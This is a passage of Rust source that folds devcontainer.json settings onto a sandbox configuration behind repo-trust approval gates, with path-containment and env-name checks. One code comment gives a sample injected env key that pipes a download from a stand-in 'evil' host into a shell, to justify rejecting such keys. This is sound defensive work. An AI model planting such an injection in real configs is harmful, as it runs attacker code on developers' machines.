//! Fold a parsed [`DevContainer`] onto a [`SandboxConfig`] and emit its
//! lifecycle commands as provisioning steps.
//!
//! This is the seam between the pure devcontainer parser
//! ([`crate::devcontainer`]) and thegn's container machinery. It maps the
//! spec's container-shape fields onto the existing `[sandbox]` config — reusing
//! `image`, `mounts`, `ports`, `volumes`, `init_script`, `prepare` rather than
//! inventing parallel plumbing — and turns the lifecycle commands into the
//! right hook for each:
//!
//! | devcontainer            | thegn hook                        |
//! |-------------------------|--------------------------------------|
//! | `initializeCommand`     | `[sandbox] prepare` (host, one-time) |
//! | `onCreateCommand`       | one-time `StepKind::Exec`            |
//! | `updateContentCommand`  | one-time `StepKind::Exec`            |
//! | `postCreateCommand`     | one-time `StepKind::Exec`            |
//! | `postStartCommand`      | `[sandbox] init_script` (per pane)   |
//! | `postAttachCommand`     | `[sandbox] init_script` (per pane)   |
//!
//! `postStart`/`postAttach` collapse to `init_script`: a terminal multiplexer
//! has no separate "attach", and `init_script` running per-pane is the closest
//! honest analogue. This is the trust-*applying* half — deciding whether the
//! (repo-committed) declaration may be applied at all is `repo_trust`'s job; the
//! caller gates before calling here.

use std::path::{Path, PathBuf};

use crate::config::SandboxConfig;
use crate::config_resolve::{Approvals, GatedRequest};
use crate::devcontainer::{
    self, Command, DevContainer, ImageSource, Mount, MountKind, SubstCtx, SubstitutionReport,
};
use crate::envplan::{ProvisionStep, StepKind};
use crate::sandbox::{Backend, BackendFamily};
use crate::sandbox_build::{self, SandboxBuild};
use crate::util::sh_quote;

use serde_json::json;

/// The default in-container path a devcontainer mounts the workspace at when
/// `workspaceFolder` is unset: `/workspaces/<repo-basename>`.
pub fn default_container_workspace_folder(local_workspace_folder: &str) -> String {
    let base = local_workspace_folder
        .trim_end_matches('/')
        .rsplit('/')
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or("workspace");
    format!("/workspaces/{base}")
}

/// Fold `dc`'s container-shape + per-session fields onto `sb`. Returns
/// human-facing warnings for anything that couldn't be represented (a caller
/// surfaces these via `model.status`). Does NOT touch `build`/`compose`/
/// `features` beyond the image reference — those are handled by their own
/// phases; `unsupported()` reports what was skipped.
///
/// Precedence: a value already pinned in `sb` (from user global/profile/
/// workspace config) wins over the devcontainer's — the devcontainer only fills
/// gaps and *adds* to the additive lists (mounts/ports/env). It never overrides
/// the user's hardening `profile`, `backend`, or `network`.
pub fn apply_to_sandbox(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) -> Vec<String> {
    let mut report = SubstitutionReport::default();
    let mut warnings = devcontainer::recognized_unapplied(dc).warnings();
    warnings.extend(fold_source(dc, sb));
    warnings.extend(fold_mounts(dc, sb, ctx, &|_| true, &mut report));
    fold_ports(dc, sb);
    fold_env_and_poststart(dc, sb, ctx, &|_| true, &mut report);
    fold_initialize(dc, sb, ctx, &|_| true, &mut report);
    warnings
}

/// Pure backend-family result for doctor and host launch planning.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BackendHonorability {
    /// No image/build/compose source was declared.
    NotApplicable,
    /// The selected source can be consumed by this backend family.
    Honored,
    /// The source is a container shape but this backend cannot consume it.
    Degraded(BackendFamily),
}

/// Whether a devcontainer source can be honored by the resolved backend.
pub fn backend_honorability(dc: &DevContainer, family: BackendFamily) -> BackendHonorability {
    let has_source = match &dc.source {
        ImageSource::Image(image) => !image.is_empty(),
        ImageSource::Build(_) | ImageSource::Compose(_) => true,
    };
    if !has_source {
        BackendHonorability::NotApplicable
    } else if family == BackendFamily::Oci {
        BackendHonorability::Honored
    } else {
        BackendHonorability::Degraded(family)
    }
}

/// Backend-specific convenience for callers that already resolved a concrete
/// runtime backend.
pub fn backend_honorability_for(dc: &DevContainer, backend: Backend) -> BackendHonorability {
    backend_honorability(dc, backend.profile().family)
}

/// The result of a trust-gated overlay: what applied, what still needs the
/// user's approval, and any non-fatal warnings.
#[derive(Debug, Default)]
pub struct GatedOverlay {
    /// `devcontainer.*` requests not yet approved — the caller prompts (via the
    /// same `repo_trust` flow as a `.thegn.toml` overlay) and re-runs.
    pub pending: Vec<GatedRequest>,
    /// Human-facing warnings (unsupported mounts, phases not yet implemented).
    pub warnings: Vec<String>,
    /// One-time lifecycle steps (`onCreate`/`updateContent`/`postCreate`),
    /// present only when the `devcontainer.lifecycle` category is approved.
    pub steps: Vec<ProvisionStep>,
    /// Local environment reads denied by the effective passthrough allowlist.
    pub substitution: SubstitutionReport,
}

/// Fold a devcontainer onto `sb` **subject to the repo-trust gate**: each
/// category (`image`/`build`/`compose`/`mounts`/`ports`/`lifecycle`) applies
/// only if the user has approved its [`GatedRequest`]; unapproved categories go
/// to `pending` and are NOT applied. `containerEnv`/`remoteEnv` are literal
/// values (no host-env widening), so they apply ungated. Same trust machinery
/// as [`crate::config_resolve::classify_repo_overlay`] — a repo-committed
/// devcontainer.json bearing arbitrary build/lifecycle commands is never
/// silently applied.
pub fn apply_gated(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    workdir: &str,
    approvals: &Approvals,
) -> GatedOverlay {
    apply_gated_with_policy(dc, sb, ctx, workdir, approvals, &|_| true)
}

/// Trust-gated fold with the effective sandbox local-environment allowlist.
pub fn apply_gated_with_policy(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    workdir: &str,
    approvals: &Approvals,
    local_env_allowed: &dyn Fn(&str) -> bool,
) -> GatedOverlay {
    let mut o = GatedOverlay::default();
    let ok = |req: &GatedRequest, o: &mut GatedOverlay| {
        let approved = approvals.is_approved(req);
        if !approved {
            o.pending.push(req.clone());
        }
        approved
    };

    o.warnings = devcontainer::recognized_unapplied(dc).warnings();

    // image / build / compose
    if let Some(req) = source_request(dc)
        && ok(&req, &mut o)
    {
        o.warnings.extend(fold_source(dc, sb));
    }

    // mounts
    if let Some(req) = mounts_request(dc)
        && ok(&req, &mut o)
    {
        o.warnings.extend(fold_mounts(
            dc,
            sb,
            ctx,
            local_env_allowed,
            &mut o.substitution,
        ));
    }

    // ports
    if let Some(req) = ports_request(dc)
        && ok(&req, &mut o)
    {
        fold_ports(dc, sb);
    }

    // env always applies (literal values); postStart/postAttach + initialize +
    // the one-time steps are all part of the single lifecycle category.
    fold_env(dc, sb, ctx, local_env_allowed, &mut o.substitution);
    if let Some(req) = lifecycle_request(dc)
        && ok(&req, &mut o)
    {
        fold_poststart(dc, sb, ctx, local_env_allowed, &mut o.substitution);
        fold_initialize(dc, sb, ctx, local_env_allowed, &mut o.substitution);
        o.steps =
            lifecycle_steps_with_policy(dc, workdir, ctx, local_env_allowed, &mut o.substitution);
    }

    // features: gate only — the install steps are emitted by the provisioner
    // via `gated_feature_steps` (they run in-container, not at overlay time).
    if let Some(req) = features_request(dc) {
        let _ = ok(&req, &mut o);
    }

    o
}

/// The one-time lifecycle steps (`onCreate` → `updateContent` → `postCreate`)
/// as ordered [`ProvisionStep`]s, to be appended to an `EnvPlan` by the applier
/// after `envplan::plan`. Each runs in `workdir`. Ids are stable for
/// idempotence + the loading screen.
pub fn lifecycle_steps(dc: &DevContainer, workdir: &str, ctx: &SubstCtx) -> Vec<ProvisionStep> {
    let mut report = SubstitutionReport::default();
    lifecycle_steps_with_policy(dc, workdir, ctx, &|_| true, &mut report)
}

fn lifecycle_steps_with_policy(
    dc: &DevContainer,
    workdir: &str,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) -> Vec<ProvisionStep> {
    let mut steps = Vec::new();
    let wd = sh_quote(workdir);
    let mut emit = |hook: &str, cmds: &[Command], steps: &mut Vec<ProvisionStep>| {
        for (i, cmd) in cmds.iter().enumerate() {
            let script = format!(
                "cd {wd} && {}",
                command_to_shell(dc, cmd, ctx, local_env_allowed, report)
            );
            steps.push(ProvisionStep {
                id: format!("devcontainer.{hook}.{i}"),
                label: format!("devcontainer: {hook}Command"),
                kind: StepKind::Exec(script),
            });
        }
    };
    emit("onCreate", &dc.lifecycle.on_create, &mut steps);
    emit("updateContent", &dc.lifecycle.update_content, &mut steps);
    emit("postCreate", &dc.lifecycle.post_create, &mut steps);
    steps
}

/// The trust-gated one-time lifecycle steps for the provisioner to append after
/// `envplan::plan`. Empty when the `devcontainer.lifecycle` category isn't
/// approved (the container-shape overlay surfaces the pending request; the
/// provisioner just skips the steps until then).
pub fn gated_steps(
    dc: &DevContainer,
    workdir: &str,
    ctx: &SubstCtx,
    approvals: &Approvals,
) -> Vec<ProvisionStep> {
    let mut report = SubstitutionReport::default();
    gated_steps_with_policy(dc, workdir, ctx, approvals, &|_| true, &mut report)
}

fn gated_steps_with_policy(
    dc: &DevContainer,
    workdir: &str,
    ctx: &SubstCtx,
    approvals: &Approvals,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) -> Vec<ProvisionStep> {
    match lifecycle_request(dc) {
        Some(req) if !approvals.is_approved(&req) => Vec::new(),
        _ => lifecycle_steps_with_policy(dc, workdir, ctx, local_env_allowed, report),
    }
}

/// The trust-gated feature-install steps for the provisioner (ordered; run
/// after the toolchain, before lifecycle commands). Empty when there are no
/// features or the `devcontainer.features` category isn't approved.
pub fn gated_feature_steps(
    dc: &DevContainer,
    remote_user: &str,
    approvals: &Approvals,
) -> Vec<ProvisionStep> {
    match features_request(dc) {
        Some(req) if !approvals.is_approved(&req) => Vec::new(),
        _ => crate::devcontainer_features::feature_steps(dc, remote_user),
    }
}

// ---- per-category folds ---------------------------------------------------

/// Resolve the image source onto `sb`: a plain `image` fills `sb.image`; a
/// `build` sets `sb.image` to a content-addressed tag + `sb.build`; a compose
/// source is deferred to its phase (warned).
fn fold_source(dc: &DevContainer, sb: &mut SandboxConfig) -> Vec<String> {
    match &dc.source {
        ImageSource::Image(img) => {
            fold_image(dc, sb);
            // A devcontainer image is self-contained — don't shadow its `/usr`,
            // `/bin`, etc. with the host toolchain (`auto_caches` injection).
            if !img.is_empty() {
                sb.auto_caches = false;
            }
            Vec::new()
        }
        ImageSource::Build(b) => {
            let w = fold_build(dc, b, sb);
            sb.auto_caches = false;
            w
        }
        ImageSource::Compose(c) => fold_compose(dc, c, sb),
    }
}

/// Encode a devcontainer compose source into `sb.compose` (paths resolved
/// against the devcontainer dir). No-op when the user already set a compose file.
fn fold_compose(
    dc: &DevContainer,
    c: &crate::devcontainer::Compose,
    sb: &mut SandboxConfig,
) -> Vec<String> {
    if sb.compose.is_some() {
        return Vec::new();
    }
    let Some(dir) = &dc.config_dir else {
        return vec![
            "devcontainer: `dockerComposeFile` needs a resolved config dir (skipped)".into(),
        ];
    };
    let files: Vec<String> = match c
        .files
        .iter()
        .map(|f| resolve_under(dir, f))
        .collect::<Result<Vec<String>, _>>()
    {
        Ok(files) => files,
        Err(error) => {
            return vec![format!(
                "devcontainer: `dockerComposeFile` {error} (skipped)"
            )];
        }
    };
    let cs = crate::sandbox_compose::ComposeSpec {
        files,
        service: (!c.service.is_empty()).then(|| c.service.clone()),
        run_services: c.run_services.clone(),
    };
    sb.compose = Some(cs.encode());
    // A compose service's mounts/ports come from the compose file, not from
    // thegn's `run` opts — note the gap so it isn't silently dropped.
    let mut warns = Vec::new();
    if !dc.mounts.is_empty() || !dc.forward_ports.is_empty() {
        warns.push(
            "devcontainer: mounts/forwardPorts on a compose service are governed by the \
             compose file, not applied by thegn"
                .into(),
        );
    }
    warns
}

fn fold_image(dc: &DevContainer, sb: &mut SandboxConfig) {
    if let ImageSource::Image(img) = &dc.source
        && !img.is_empty()
        && sb.image.is_empty()
    {
        sb.image = img.clone();
    }
}

/// Turn a devcontainer `build` block into a [`SandboxBuild`] on `sb` (paths
/// resolved against the devcontainer directory) + a content-addressed
/// `sb.image` tag. Dockerfile hash failures keep the build and return a
/// declaration-only tag warning. No-op when the user pinned an image (their
/// choice wins) or the config dir is unknown (bare-text parse).
fn fold_build(
    dc: &DevContainer,
    b: &crate::devcontainer::Build,
    sb: &mut SandboxConfig,
) -> Vec<String> {
    if !sb.image.is_empty() {
        return Vec::new();
    }
    let Some(dir) = &dc.config_dir else {
        return vec!["devcontainer: `build` needs a resolved config dir (skipped)".into()];
    };
    let (dockerfile, context) = match (
        resolve_under(dir, &b.dockerfile),
        resolve_under(dir, &b.context),
    ) {
        (Ok(dockerfile), Ok(context)) => (dockerfile, context),
        (Err(error), _) | (_, Err(error)) => {
            return vec![format!("devcontainer: build path {error} (skipped)")];
        }
    };
    let build = SandboxBuild {
        dockerfile,
        context,
        args: b.args.clone(),
        target: b.target.clone(),
    };
    let dockerfile_sha256 = sandbox_build::dockerfile_sha256(Path::new(&build.dockerfile));
    let mut warnings = Vec::new();
    let digest = match dockerfile_sha256 {
        Ok(digest) => Some(digest),
        Err(error) => {
            warnings.push(format!(
                "devcontainer: could not hash Dockerfile {} ({error}); its bytes are omitted from the image tag",
                build.dockerfile
            ));
            None
        }
    };
    let context_digest = match sandbox_build::context_sha256(Path::new(&build.context)) {
        Ok(digest) => Some(digest),
        Err(error) => {
            warnings.push(format!(
                "devcontainer: could not digest build context {} ({error}); the image tag covers the Dockerfile (when readable) and build declaration only",
                build.context
            ));
            None
        }
    };
    sb.image = sandbox_build::content_tag(
        &tag_basename(dir),
        &build,
        digest.as_deref(),
        context_digest.as_deref(),
    );
    sb.build = Some(build);
    warnings
}

/// Resolve a repo-authored path under its worktree. Parent traversal is
/// accepted only while it remains within the inferred repository root, and
/// an existing parent is canonicalized to catch symlink escapes.
fn resolve_under(dir: &Path, p: &str) -> Result<String, &'static str> {
    let pp = Path::new(p);
    if pp.is_absolute() {
        return Err("is absolute");
    }
    let root = repository_root(dir);
    let mut depth = dir
        .strip_prefix(&root)
        .expect("repository root is a prefix of config dir")
        .components()
        .count();
    for component in pp.components() {
        match component {
            std::path::Component::Normal(_) => depth += 1,
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir if depth > 0 => depth -= 1,
            std::path::Component::ParentDir
            | std::path::Component::RootDir
            | std::path::Component::Prefix(_) => {
                return Err("escapes the repository");
            }
        }
    }
    let resolved = if p.is_empty() || p == "." {
        dir.to_path_buf()
    } else {
        dir.join(pp)
    };
    let check_path = if resolved.exists() {
        resolved.as_path()
    } else {
        resolved.parent().unwrap_or(dir)
    };
    if let Ok(canonical_path) = check_path.canonicalize() {
        let canonical_root = root
            .canonicalize()
            .map_err(|_| "cannot verify repository containment")?;
        if !canonical_path.starts_with(canonical_root) {
            return Err("escapes the repository through a symlink");
        }
    }
    Ok(resolved.to_string_lossy().into_owned())
}

fn repository_root(dir: &Path) -> PathBuf {
    if dir.file_name().is_some_and(|name| name == ".devcontainer") {
        return dir.parent().unwrap_or(dir).to_path_buf();
    }
    if dir
        .parent()
        .and_then(Path::file_name)
        .is_some_and(|name| name == ".devcontainer")
    {
        return dir
            .parent()
            .and_then(Path::parent)
            .unwrap_or(dir)
            .to_path_buf();
    }
    dir.to_path_buf()
}

/// A human tag hint from the config dir: the worktree/project name (the parent
/// of a `.devcontainer/` folder), not the literal `.devcontainer`.
fn tag_basename(dir: &Path) -> String {
    let name = dir.file_name().map(|s| s.to_string_lossy().into_owned());
    match name.as_deref() {
        Some(".devcontainer") => dir
            .parent()
            .and_then(|p| p.file_name())
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "img".into()),
        Some(n) => n.to_string(),
        None => "img".into(),
    }
}

fn fold_mounts(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) -> Vec<String> {
    let mut warnings = Vec::new();
    for m in &dc.mounts {
        match mount_to_sandbox(m, ctx, local_env_allowed, report, dc) {
            MountOutcome::Bind(spec) => {
                if !sb.mounts.contains(&spec) {
                    sb.mounts.push(spec);
                }
            }
            MountOutcome::Volume {
                name,
                dest,
                readonly,
            } => {
                if readonly {
                    warnings.push(format!(
                        "devcontainer: read-only volume '{name}' mounted read-write (unsupported)"
                    ));
                }
                if let std::collections::hash_map::Entry::Vacant(entry) =
                    sb.volumes.entry(name.clone())
                {
                    entry.insert(dest);
                    if let Some(id) = config_devcontainer_id(dc) {
                        sb.volume_owners.insert(name, id);
                    }
                }
            }
            MountOutcome::Unsupported(why) => warnings.push(why),
        }
    }
    warnings
}

fn fold_ports(dc: &DevContainer, sb: &mut SandboxConfig) {
    for p in &dc.forward_ports {
        if !sb.ports.contains(p) {
            sb.ports.push(p.clone());
        }
    }
}

/// `containerEnv` + `remoteEnv` → `export` lines prepended to `init_script`.
/// Literal values, not host-env passthrough keys, so this never widens the
/// passthrough allow-list. containerEnv first so remoteEnv may reference it.
fn fold_env(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) {
    let mut exports = String::new();
    for (k, v) in dc.container_env.iter().chain(dc.remote_env.iter()) {
        // The value is sh_quote'd, but the KEY is pasted verbatim into
        // `export {k}=…`. A repo-committed devcontainer.json is attacker-
        // controlled, and env applies UNGATED (literal values), so a crafted
        // key like `TZ=UTC; curl evil|sh #` would inject shell. Only accept
        // POSIX env-name keys; drop + warn on anything else so the gate can't
        // be bypassed through the env channel.
        if !is_valid_env_name(k) {
            tracing::warn!(key = %k, "devcontainer: dropping env with non-identifier name");
            continue;
        }
        exports.push_str(&format!(
            "export {}={}\n",
            k,
            sh_quote(&ctx_subst(dc, v, ctx, local_env_allowed, report))
        ));
    }
    prepend_init(sb, exports);
}

/// True when `k` is a POSIX-portable environment-variable name
/// (`[A-Za-z_][A-Za-z0-9_]*`) — the only shape safe to paste after `export `.
fn is_valid_env_name(k: &str) -> bool {
    let mut chars = k.chars();
    matches!(chars.next(), Some(c) if c == '_' || c.is_ascii_alphabetic())
        && chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// `postStart` + `postAttach` → `init_script` (per-pane). A multiplexer has no
/// separate attach, so both collapse here.
fn fold_poststart(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) {
    let mut lines = String::new();
    for cmd in dc
        .lifecycle
        .post_start
        .iter()
        .chain(dc.lifecycle.post_attach.iter())
    {
        lines.push_str(&command_to_shell(dc, cmd, ctx, local_env_allowed, report));
        lines.push('\n');
    }
    prepend_init(sb, lines);
}

/// Convenience for the ungated all-in-one path: env + postStart together.
fn fold_env_and_poststart(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) {
    fold_env(dc, sb, ctx, local_env_allowed, report);
    fold_poststart(dc, sb, ctx, local_env_allowed, report);
}

/// `initializeCommand` → host-side `prepare` (one-time, before the container).
fn fold_initialize(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) {
    for cmd in &dc.lifecycle.initialize {
        let line = command_to_shell(dc, cmd, ctx, local_env_allowed, report);
        if !sb.prepare.contains(&line) {
            sb.prepare.push(line);
        }
    }
}

fn prepend_init(sb: &mut SandboxConfig, extra: String) {
    if extra.is_empty() {
        return;
    }
    if sb.init_script.is_empty() {
        sb.init_script = extra;
    } else {
        sb.init_script = format!("{}\n{extra}", sb.init_script);
    }
}

// ---- trust-gate request builders ------------------------------------------
//
// Requests are keyed on the RAW (pre-substitution) declaration so the canonical
// trust key is stable across machines/paths; a change to the devcontainer.json
// changes the canonical value and re-prompts.

/// All `devcontainer.*` requests this declaration would make (for a "review
/// before trusting" listing).
pub fn gate_requests(dc: &DevContainer) -> Vec<GatedRequest> {
    [
        source_request(dc),
        mounts_request(dc),
        ports_request(dc),
        lifecycle_request(dc),
        features_request(dc),
    ]
    .into_iter()
    .flatten()
    .collect()
}

fn source_request(dc: &DevContainer) -> Option<GatedRequest> {
    match &dc.source {
        ImageSource::Image(img) if !img.is_empty() => Some(GatedRequest {
            key: "devcontainer.image".into(),
            value: json!(img),
            summary: format!("run in devcontainer image `{img}`"),
        }),
        ImageSource::Image(_) => None,
        ImageSource::Build(b) => Some(GatedRequest {
            key: "devcontainer.build".into(),
            value: json!({
                "dockerfile": b.dockerfile,
                "context": b.context,
                "target": b.target,
                "args": b.args,
            }),
            summary: format!("build devcontainer image from `{}`", b.dockerfile),
        }),
        ImageSource::Compose(c) => Some(GatedRequest {
            key: "devcontainer.compose".into(),
            value: json!({ "files": c.files, "service": c.service, "runServices": c.run_services }),
            summary: format!(
                "start docker-compose service `{}` from {}",
                c.service,
                c.files.join(", ")
            ),
        }),
    }
}

fn mounts_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.mounts.is_empty() {
        return None;
    }
    let raw: Vec<serde_json::Value> = dc
        .mounts
        .iter()
        .map(|m| {
            json!({
                "src": m.source,
                "dst": m.target,
                "type": mount_kind_str(m.kind),
                "ro": m.readonly,
            })
        })
        .collect();
    let summary = dc
        .mounts
        .iter()
        .map(|m| match &m.source {
            Some(s) => format!("{s} → {}", m.target),
            None => m.target.clone(),
        })
        .collect::<Vec<_>>()
        .join(", ");
    Some(GatedRequest {
        key: "devcontainer.mounts".into(),
        value: json!(raw),
        summary: format!("mount {summary}"),
    })
}

fn ports_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.forward_ports.is_empty() {
        return None;
    }
    Some(GatedRequest {
        key: "devcontainer.ports".into(),
        value: json!(dc.forward_ports),
        summary: format!("forward ports {}", dc.forward_ports.join(", ")),
    })
}

fn lifecycle_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.lifecycle.is_empty() {
        return None;
    }
    let disp = |cmds: &[Command]| -> Vec<String> { cmds.iter().map(command_display).collect() };
    let value = json!({
        "initialize": disp(&dc.lifecycle.initialize),
        "onCreate": disp(&dc.lifecycle.on_create),
        "updateContent": disp(&dc.lifecycle.update_content),
        "postCreate": disp(&dc.lifecycle.post_create),
        "postStart": disp(&dc.lifecycle.post_start),
        "postAttach": disp(&dc.lifecycle.post_attach),
    });
    // The summary highlights host execution — `initializeCommand` runs on the
    // HOST (outside any sandbox), which is strictly more dangerous.
    let mut parts = Vec::new();
    if !dc.lifecycle.initialize.is_empty() {
        parts.push(format!(
            "ON HOST: {}",
            disp(&dc.lifecycle.initialize).join("; ")
        ));
    }
    let in_ctr: Vec<String> = disp(&dc.lifecycle.on_create)
        .into_iter()
        .chain(disp(&dc.lifecycle.update_content))
        .chain(disp(&dc.lifecycle.post_create))
        .chain(disp(&dc.lifecycle.post_start))
        .chain(disp(&dc.lifecycle.post_attach))
        .collect();
    if !in_ctr.is_empty() {
        parts.push(format!("in container: {}", in_ctr.join("; ")));
    }
    Some(GatedRequest {
        key: "devcontainer.lifecycle".into(),
        value,
        summary: format!(
            "run devcontainer lifecycle commands — {}",
            parts.join(" | ")
        ),
    })
}

fn features_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.features.is_empty() {
        return None;
    }
    let ids: Vec<String> = dc.features.keys().cloned().collect();
    Some(GatedRequest {
        key: "devcontainer.features".into(),
        value: json!(ids),
        summary: format!("install devcontainer features: {}", ids.join(", ")),
    })
}

fn mount_kind_str(k: MountKind) -> &'static str {
    match k {
        MountKind::Bind => "bind",
        MountKind::Volume => "volume",
        MountKind::Tmpfs => "tmpfs",
    }
}

/// Raw (unsubstituted) one-line display of a command, for trust summaries.
fn command_display(cmd: &Command) -> String {
    match cmd {
        Command::Shell(s) => s.clone(),
        Command::Argv(v) => v.join(" "),
    }
}

// ---- internals ------------------------------------------------------------

enum MountOutcome {
    Bind(String),
    Volume {
        name: String,
        dest: String,
        readonly: bool,
    },
    Unsupported(String),
}

fn mount_to_sandbox(
    m: &Mount,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
    dc: &DevContainer,
) -> MountOutcome {
    let target = ctx_subst(dc, &m.target, ctx, local_env_allowed, report);
    match m.kind {
        MountKind::Bind => match &m.source {
            Some(src) => {
                let src = ctx_subst(dc, src, ctx, local_env_allowed, report);
                let mut spec = format!("{src}:{target}");
                if m.readonly {
                    spec.push_str(":ro");
                }
                MountOutcome::Bind(spec)
            }
            None => MountOutcome::Unsupported(format!(
                "devcontainer: bind mount to '{target}' has no source (skipped)"
            )),
        },
        MountKind::Volume => match &m.source {
            Some(name) => MountOutcome::Volume {
                name: ctx_subst(dc, name, ctx, local_env_allowed, report),
                dest: target,
                readonly: m.readonly,
            },
            None => MountOutcome::Unsupported(format!(
                "devcontainer: anonymous volume at '{target}' (skipped)"
            )),
        },
        MountKind::Tmpfs => {
            MountOutcome::Unsupported(format!("devcontainer: tmpfs mount at '{target}' (skipped)"))
        }
    }
}

/// Render a lifecycle [`Command`] to a single shell line with `${...}`
/// variables substituted. Argv form is shell-quoted so it runs literally.
fn command_to_shell(
    dc: &DevContainer,
    cmd: &Command,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) -> String {
    match cmd {
        Command::Shell(s) => ctx_subst(dc, s, ctx, local_env_allowed, report),
        Command::Argv(argv) => argv
            .iter()
            .map(|a| sh_quote(&ctx_subst(dc, a, ctx, local_env_allowed, report)))
            .collect::<Vec<_>>()
            .join(" "),
    }
}

fn ctx_subst(
    dc: &DevContainer,
    s: &str,
    ctx: &SubstCtx,
    local_env_allowed: &dyn Fn(&str) -> bool,
    report: &mut SubstitutionReport,
) -> String {
    let id = config_devcontainer_id(dc);
    let (value, seen) = match id {
        Some(id) => {
            devcontainer::substitute_with_devcontainer_id_report(s, ctx, &id, local_env_allowed)
        }
        None => devcontainer::substitute_with_report(s, ctx, local_env_allowed),
    };
    report.blocked_local_env.extend(seen.blocked_local_env);
    value
}

fn config_devcontainer_id(dc: &DevContainer) -> Option<String> {
    dc.config_path.as_ref().map(|path| {
        let repo = if path
            .parent()
            .and_then(Path::file_name)
            .is_some_and(|name| name == ".devcontainer")
        {
            path.parent().and_then(Path::parent).unwrap_or(path)
        } else if path
            .parent()
            .and_then(Path::parent)
            .and_then(Path::file_name)
            .is_some_and(|name| name == ".devcontainer")
        {
            path.parent()
                .and_then(Path::parent)
                .and_then(Path::parent)
                .unwrap_or(path)
        } else {
            path.parent().unwrap_or(path)
        };
        let rel = path.strip_prefix(repo).unwrap_or(path).to_path_buf();
        devcontainer::devcontainer_id(repo, &rel)
    })
}

/// Return the Dockerfile or Compose files selected by this devcontainer config.
/// Build context directory contents are not part of this referenced-file set.
pub fn referenced_files(
    dc: &crate::devcontainer::DevContainer,
    config_dir: &Path,
) -> Result<Vec<PathBuf>, String> {
    let references = match &dc.source {
        crate::devcontainer::ImageSource::Image(_) => Vec::new(),
        crate::devcontainer::ImageSource::Build(build) => vec![build.dockerfile.as_str()],
        crate::devcontainer::ImageSource::Compose(compose) => {
            compose.files.iter().map(String::as_str).collect()
        }
    };
    let mut paths = references
        .into_iter()
        .map(|reference| {
            resolve_under(config_dir, reference)
                .map(PathBuf::from)
                .map_err(|reason| format!("devcontainer reference `{reference}` {reason}"))
        })
        .collect::<Result<Vec<_>, _>>()?;
    paths.sort();
    paths.dedup();
    Ok(paths)
}

/// The kind of file reference found inside a Compose file.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ComposeReferenceKind {
    EnvFile,
    Dockerfile,
    ExtendsFile,
    Include,
}

/// One file referenced from a Compose file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ComposeReference {
    pub kind: ComposeReferenceKind,
    pub path: PathBuf,
    pub required: bool,
}

/// Files one Compose file references, resolved against `base_dir` and
/// contained in the repository that `config_dir` belongs to.
///
/// Build context directories are checked for containment but are not returned;
/// their contents remain outside this closure.
pub fn compose_file_references(
    config_dir: &Path,
    base_dir: &Path,
    yaml: &str,
) -> Result<Vec<ComposeReference>, String> {
    let mut document = serde_yaml::from_str::<serde_yaml::Value>(yaml)
        .map_err(|_| "is not a valid Compose file".to_string())?;
    document
        .apply_merge()
        .map_err(|_| "is not a valid Compose file".to_string())?;
    let root = document
        .as_mapping()
        .ok_or_else(|| "is not a valid Compose file".to_string())?;
    let mut references = Vec::new();
    if let Some(services) = mapping_value(root, "services")
        && let Some(services) = services.as_mapping()
    {
        for (_, service) in services {
            let Some(service) = service.as_mapping() else {
                continue;
            };
            if let Some(env_file) = mapping_value(service, "env_file") {
                collect_env_files(config_dir, base_dir, env_file, &mut references)?;
            }
            if let Some(build) = mapping_value(service, "build") {
                collect_build_files(config_dir, base_dir, build, &mut references)?;
            }
            if let Some(extends) = mapping_value(service, "extends")
                && let Some(extends) = extends.as_mapping()
                && let Some(file) = mapping_value(extends, "file")
            {
                let reference = file.as_str().ok_or_else(|| {
                    "Compose reference `extends.file` is not a string".to_string()
                })?;
                references.push(resolve_compose_reference(
                    config_dir,
                    base_dir,
                    reference,
                    ComposeReferenceKind::ExtendsFile,
                    true,
                )?);
            }
        }
    }
    if let Some(include) = mapping_value(root, "include") {
        collect_include(config_dir, base_dir, include, &mut references)?;
    }
    references.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then_with(|| left.kind.cmp(&right.kind))
            .then_with(|| left.required.cmp(&right.required))
    });
    references.dedup();
    Ok(references)
}

fn mapping_value<'a>(mapping: &'a serde_yaml::Mapping, key: &str) -> Option<&'a serde_yaml::Value> {
    mapping.get(serde_yaml::Value::String(key.to_string()))
}

fn collect_env_files(
    config_dir: &Path,
    base_dir: &Path,
    value: &serde_yaml::Value,
    references: &mut Vec<ComposeReference>,
) -> Result<(), String> {
    match value {
